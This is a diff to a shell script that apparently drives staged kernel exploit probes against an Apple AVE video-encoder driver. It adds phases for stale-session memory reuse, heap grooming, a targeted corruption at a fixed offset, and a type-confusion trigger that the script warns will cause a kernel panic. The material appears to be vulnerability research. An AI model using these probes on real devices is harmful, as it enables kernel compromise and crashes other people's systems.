@@ -74,7 +74,32 @@ echo ">>> 210 encodes — SAFE stop before SIMD overwrite"
 run_probe com.research.avefullchain simd_safe 0x4141
 
 echo ""
-echo "PHASE 6: Cross-Buffer & Spray"
+echo "PHASE 6: Session Reuse (Stale Counter Attack)"
+echo "==============================================="
+echo ">>> Tests if kalloc_data memory is zeroed on reuse"
+run_probe com.research.avefullchain session_reuse 0xDEAD 5
+echo ""
+echo ">>> Enhanced: heap grooming for better slot reuse (lid=2 for dispatch)"
+run_probe com.research.avefullchain session_reuse_groom 2 3
+
+echo ""
+echo "PHASE 7: Safe-Window Corruption"
+echo "================================"
+echo ">>> 196 encodes, corrupts only +0x5C34 (safe, no crash expected)"
+run_probe com.research.avefullchain safe_corrupt 0xFFFF 196
+
+echo ""
+echo "PHASE 8: Type Confusion (THE CRITICAL TEST)"
+echo "============================================="
+echo ">>> 215 encodes with lid=2 → targets value==2 dispatch at +0x5F94"
+echo ">>> This WILL kernel panic if crash_test hasn't been survived first!"
+echo ">>> Only run if Phase 3 deep (250 enc) survived."
+echo ">>> Press Enter to continue, or Ctrl+C to stop..."
+read -r
+run_probe com.research.avefullchain type_confusion 215
+
+echo ""
+echo "PHASE 9: Cross-Buffer & Spray"
 echo "=============================="
 run_probe com.research.avecrossbuffer measure
 run_probe com.research.aveiosurfspray readback
